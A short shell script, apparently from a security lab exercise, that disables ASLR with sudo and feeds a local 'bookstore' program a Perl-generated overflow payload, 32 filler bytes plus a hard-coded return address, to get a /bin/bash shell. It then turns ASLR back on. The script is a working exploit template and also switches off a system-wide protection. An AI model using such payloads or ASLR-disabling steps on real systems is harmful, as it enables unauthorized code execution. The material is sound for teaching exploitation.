#Disable ASLR
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
if [ "$1" != "normal" ]; then
./bookstore /bin/bash `perl -e 'printf "A" x 32 . "\xf0\xa8\xa5\xf7\xff\x7f\x00\x00"'`
else
./bookstore /bin/bash HarryPorter.txt KiteRunner.txt
fi

#Renable ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
